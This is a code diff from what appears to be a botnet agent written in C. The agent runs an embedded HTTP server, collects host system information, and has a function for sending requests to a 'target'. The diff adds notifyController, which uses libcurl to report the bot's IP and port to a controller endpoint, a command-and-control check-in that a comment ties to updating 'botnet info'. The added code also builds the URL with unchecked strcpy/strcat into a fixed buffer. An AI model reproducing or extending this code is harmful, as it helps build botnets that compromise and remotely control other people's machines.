@@ -134,7 +134,7 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
     {
         // TODO handle sys_info
         char info[1000000] = {0};
-        ret = sendSystemInfo(info);
+        ret = getSystemInfo(info);
         response = MHD_create_response_from_buffer(strlen(info), (void *)info, MHD_RESPMEM_PERSISTENT);
 
         endpoint = NULL;
@@ -146,6 +146,8 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
 
         endpoint = NULL;
     }
+
+    notifyController();
 
     // TODO create a method that send a request(response?) to controller in order to notify it that action has been performed, the controller will update the botnet info
     ret = MHD_queue_response(connection, MHD_HTTP_OK, response);
@@ -171,7 +173,7 @@ int sendRequestToTarget(const char *request)
     return 1;
 }
 
-int sendSystemInfo(char *info)
+int getSystemInfo(char *info)
 {
 
     struct utsname buff;
@@ -244,4 +246,35 @@ int sendSystemInfo(char *info)
 
     printf("Sending following info about system: %s", info);
     return 1;
+}
+
+
+void notifyController(){
+
+    CURL *curl;
+
+    curl = curl_easy_init();
+
+    if (curl == NULL)
+        handle_error("Could not execute command, error initializing curl handle");
+    
+    char url[255] = {0};
+    char buff[sizeof(long)*8+1];
+    sprintf(buff,"%ld",port);
+    strcpy(url, CONTROLLER_NOTIFY_ENDPOINT);
+    strcat(url,IP);
+    strcat(url,"&PORT=");
+    strcat(url, buff );
+
+    printf("Sending notification to : %s \n",url);
+    curl_easy_setopt(curl, CURLOPT_URL, url);
+    curl_easy_setopt(curl, CURLOPT_PORT, CONTROLLER_PORT);
+
+    ret = curl_easy_perform(curl);
+
+    printf("Response : ");
+
+    curl_easy_cleanup(curl);
+
+
 }
